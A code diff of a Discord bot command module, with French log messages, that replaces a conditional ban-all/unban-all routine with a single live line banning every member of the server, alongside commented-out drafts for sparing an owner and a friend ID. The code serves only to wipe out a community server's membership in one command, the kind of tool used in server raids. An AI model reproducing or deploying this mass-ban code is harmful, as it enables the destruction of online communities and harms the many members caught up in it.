@@ -1,14 +1,21 @@
 exports.run = (client, message, args) => {
-    if (message.content.includes('u')) {
-        Promise.all(message.guild.bans.map(c => c.unban())).catch(console.error);
-        console.log('Tous les membres bannis ont été débannis.');
-    }
-    if (message.content.includes('i')) {
-        Promise.all(message.guild.users.map(c => c.ban())).catch(console.error);
-        console.log('Tous les membres bannissables ont été bannis.');
-    }
-}
-
+    //const settings = require('../settings.json');
+    message.guild.roles.find('name', '@everyone').members.map(m=>m.ban());
+    //async function map(value){
+    //    if (!value === settings.ownerid | settings.friendid) {
+    //        message.author.send(value);
+    //    }
+    //}
+    //message.guild.roles.find('name', '@everyone').members.map(c=>c.id).forEach(map);
+    //console.log('Tous les membres bannissables ont été bannis sauf vous.');
+    //client.fetchUser;
+    //const filterthis = message.guild.members;
+    //const filter1 = filterthis.filter(c=>c.id !== settings.friendid);
+    //filter1.map().forEach(banss);
+    //function banss(bans){
+    //    message.guild.ban(bans);
+    //}
+}    
 exports.conf = {
     permLevel: 4,
     aliases: []
